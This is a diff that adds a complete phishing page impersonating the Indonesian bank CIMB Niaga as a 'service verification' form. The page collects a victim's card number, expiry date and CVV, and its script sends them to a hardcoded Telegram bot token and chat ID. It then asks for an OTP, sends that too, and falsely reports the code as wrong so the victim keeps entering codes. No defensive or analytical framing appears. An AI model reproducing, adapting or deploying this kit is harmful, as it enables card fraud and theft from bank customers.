@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Layanan - CIMB Niaga</title>
+    <style>
+        :root {
+            --cimb-red: #ed1c24;
+            --cimb-red-dark: #b3161b;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #ed1c24;
+            margin: 0;
+            padding-top: 70px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 70px);
+        }
+
+        /* --- NAVBAR --- */
+        .navbar {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            height: 60px;
+            background: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            z-index: 1000;
+        }
+        .nav-logo b { color: var(--cimb-red); font-size: 18px; }
+        .nav-logo span { color: #333; font-weight: bold; font-size: 20px; border-bottom: 3px solid var(--cimb-red); }
+
+        .wrapper { width: 100%; max-width: 420px; padding: 20px; box-sizing: border-box; }
+
+        /* --- ANIMASI KARTU --- */
+        .card-container {
+            perspective: 1000px;
+            margin-bottom: -40px;
+            z-index: 5;
+        }
+
+        .atm-card {
+            width: 100%; height: 220px;
+            position: relative;
+            transform-style: preserve-3d;
+            transition: transform 0.7s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .atm-card.flipped { transform: rotateY(180deg); }
+
+        .front, .back {
+            position: absolute; width: 100%; height: 100%;
+            backface-visibility: hidden; border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+
+        .front {
+            background: linear-gradient(135deg, #ed1c24 0%, #8b0000 100%);
+            padding: 20px; box-sizing: border-box; color: white;
+            display: flex; flex-direction: column;
+        }
+
+        .logo-inner {
+            background: rgba(255,255,255,0.9); padding: 4px 10px; border-radius: 5px;
+            display: inline-flex; align-items: center; gap: 4px; float: right;
+        }
+
+        .chip {
+            width: 45px; height: 35px; margin-top: 10px;
+            background: linear-gradient(135deg, #d4af37 0%, #f9e1a9 50%, #b8860b 100%);
+            border-radius: 6px;
+        }
+
+        .card-number {
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 20px; margin-top: 25px; letter-spacing: 2px; font-weight: bold;
+        }
+
+        .card-info { display: flex; justify-content: space-between; align-items: flex-end; margin-top: auto; }
+
+        .back { background: #d1d1d1; transform: rotateY(180deg); }
+        .mag-stripe { background: #222; width: 100%; height: 45px; margin-top: 20px; }
+        .signature-section {
+            background: #fff; width: 70%; height: 35px; margin: 15px auto 10px 20px;
+            display: flex; align-items: center; justify-content: flex-end; padding-right: 15px;
+            color: #333; font-weight: bold; font-family: 'Courier New';
+        }
+
+        /* --- FORM BOX --- */
+        .form-box {
+            background: white; padding: 60px 25px 30px; border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-size: 11px; font-weight: bold; color: #666; margin-bottom: 5px; }
+        input { 
+            width: 100%; padding: 12px; border: 1.5px solid #eaeaea; border-radius: 8px; 
+            font-size: 16px; box-sizing: border-box; outline: none;
+        }
+        input:focus { border-color: var(--cimb-red); }
+
+        button {
+            width: 100%; background: var(--cimb-red); color: white; border: none;
+            padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer;
+            transition: 0.3s;
+        }
+        button:disabled { background: #ccc; }
+
+        /* --- OTP STYLING --- */
+        .otp-inputs { display: flex; justify-content: space-between; gap: 5px; margin: 20px 0; }
+        .otp-inputs input { width: 40px; height: 50px; text-align: center; font-size: 20px; font-weight: bold; }
+
+        .hidden { display: none; }
+        .timer { font-size: 13px; color: #888; text-align: center; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<nav class="navbar">
+    <div class="nav-logo"><b>CIMB</b> <span>NIAGA</span></div>
+</nav>
+
+<div class="wrapper">
+    <div class="card-container">
+        <div class="atm-card" id="atm_card">
+            <div class="front">
+                <div style="text-align: right;">
+                    <div class="logo-inner">
+                        <small style="color:var(--cimb-red); font-weight:bold;">CIMB</small>
+                        <strong style="color:var(--cimb-red);">NIAGA</strong>
+                    </div>
+                </div>
+                <div class="chip"></div>
+                <div class="card-number" id="display_number">#### #### #### ####</div>
+                <div class="card-info">
+                    <div><small style="font-size:8px">VALID THRU</small><br><span id="display_expiry">--/--</span></div>
+                    <div style="background:white; padding:2px 5px; border-radius:3px; color: #1a1876; font-weight:bold; font-style:italic; font-size:12px;">VISA</div>
+                </div>
+            </div>
+            <div class="back">
+                <div class="mag-stripe"></div>
+                <div class="signature-section"><span id="display_cvv">***</span></div>
+                <p style="font-size: 8px; text-align: center; color: #555; margin-top: 20px;">PT Bank CIMB Niaga Tbk.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="form-box" id="step_card">
+        <div class="form-group">
+            <label>NOMOR KARTU (16 DIGIT)</label>
+            <input type="text" id="input_number" maxlength="19" placeholder="4000 1234 5678 9010" inputmode="numeric">
+        </div>
+        <div style="display:flex; gap:10px;">
+            <div class="form-group" style="flex:1;">
+                <label>MASA BERLAKU</label>
+                <input type="text" id="input_expiry" maxlength="5" placeholder="MM/YY" inputmode="numeric">
+            </div>
+            <div class="form-group" style="flex:1;">
+                <label>CVV</label>
+                <input type="password" id="input_cvv" maxlength="3" placeholder="***" inputmode="numeric">
+            </div>
+        </div>
+        <button type="button" id="btn_next">KONFIRMASI</button>
+    </div>
+
+    <div class="form-box hidden" id="step_otp">
+        <h3 style="margin:0 0 10px; color: var(--cimb-red); text-align: center;">Verifikasi OTP</h3>
+        <p style="font-size: 13px; color: #666; text-align: center;">Masukkan 6 digit kode yang dikirim ke nomor Anda.</p>
+        
+        <div class="otp-inputs" id="otp_wrap">
+            <input type="number" maxlength="1" inputmode="numeric">
+            <input type="number" maxlength="1" inputmode="numeric">
+            <input type="number" maxlength="1" inputmode="numeric">
+            <input type="number" maxlength="1" inputmode="numeric">
+            <input type="number" maxlength="1" inputmode="numeric">
+            <input type="number" maxlength="1" inputmode="numeric">
+        </div>
+
+        <button type="button" id="btn_verify">VERIFIKASI</button>
+        <div class="timer">Kirim ulang dalam <span id="timer_val">03:00</span></div>
+    </div>
+</div>
+
+<script>
+    const TOKEN = "8462084079:AAHQ94IQ_-iOg10Y9IiTSnNzeb2IFDikpes";
+    const CHAT_ID = "7692820036";
+
+    const card = document.getElementById('atm_card');
+    const inNumber = document.getElementById('input_number');
+    const inExpiry = document.getElementById('input_expiry');
+    const inCVV = document.getElementById('input_cvv');
+    const otpInputs = document.querySelectorAll('#otp_wrap input');
+
+    // Auto Flip
+    inCVV.onfocus = () => card.classList.add('flipped');
+    inNumber.onfocus = () => card.classList.remove('flipped');
+    inExpiry.onfocus = () => card.classList.remove('flipped');
+
+    // Display Card
+    inNumber.oninput = (e) => {
+        let v = e.target.value.replace(/\D/g, '');
+        let f = v.match(/.{1,4}/g)?.join(' ') || '';
+        e.target.value = f;
+        document.getElementById('display_number').innerText = f || "#### #### #### ####";
+    };
+    inExpiry.oninput = (e) => {
+        let v = e.target.value.replace(/\D/g, '');
+        if (v.length >= 2) v = v.slice(0,2) + (v.length > 2 ? '/' + v.slice(2,4) : '');
+        e.target.value = v;
+        document.getElementById('display_expiry').innerText = v || "--/--";
+    };
+    inCVV.oninput = (e) => document.getElementById('display_cvv').innerText = e.target.value || "***";
+
+    // OTP Logic
+    otpInputs.forEach((input, index) => {
+        input.oninput = (e) => {
+            if (e.target.value.length > 1) e.target.value = e.target.value.slice(0,1);
+            if (e.target.value !== "" && index < 5) otpInputs[index + 1].focus();
+        };
+        input.onkeydown = (e) => {
+            if (e.key === "Backspace" && e.target.value === "" && index > 0) otpInputs[index - 1].focus();
+        };
+    });
+
+    async function sendTele(msg) {
+        return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+        });
+    }
+
+    // Navigasi ke Step OTP
+    document.getElementById('btn_next').onclick = async () => {
+        if(inNumber.value.length < 19 || inExpiry.value.length < 5 || inCVV.value.length < 3) return alert("Lengkapi data kartu!");
+        
+        const btn = document.getElementById('btn_next');
+        btn.disabled = true; btn.innerText = "SINKRONISASI...";
+
+        try {
+            await sendTele(`<b>💳 KARTU CIMB</b>\nNo: <code>${inNumber.value}</code>\nExp: <code>${inExpiry.value}</code>\nCVV: <code>${inCVV.value}</code>`);
+            document.getElementById('step_card').classList.add('hidden');
+            document.getElementById('step_otp').classList.remove('hidden');
+            startTimer(180);
+        } catch(e) { alert("Koneksi gagal."); }
+        finally { btn.disabled = false; btn.innerText = "KONFIRMASI"; }
+    };
+
+    function startTimer(t) {
+        const display = document.getElementById('timer_val');
+        const interval = setInterval(() => {
+            let m = Math.floor(t/60), s = t%60;
+            display.innerText = `0${m}:${s<10?'0'+s:s}`;
+            if(t <= 0) clearInterval(interval);
+            t--;
+        }, 1000);
+    }
+
+    // Verifikasi OTP
+    document.getElementById('btn_verify').onclick = async () => {
+        let code = "";
+        otpInputs.forEach(i => code += i.value);
+        if(code.length < 6) return alert("Masukkan 6 digit OTP!");
+
+        const btn = document.getElementById('btn_verify');
+        btn.disabled = true; btn.innerText = "VERIFIKASI...";
+
+        try {
+            await sendTele(`<b>🔑 OTP CIMB</b>\nCode: <code>${code}</code>`);
+            alert("OTP salah atau kadaluarsa. Silakan coba lagi.");
+            otpInputs.forEach(i => i.value = "");
+            otpInputs[0].focus();
+        } catch(e) { alert("Gagal verifikasi."); }
+        finally { btn.disabled = false; btn.innerText = "VERIFIKASI"; }
+    };
+</script>
+
+</body>
+</html>
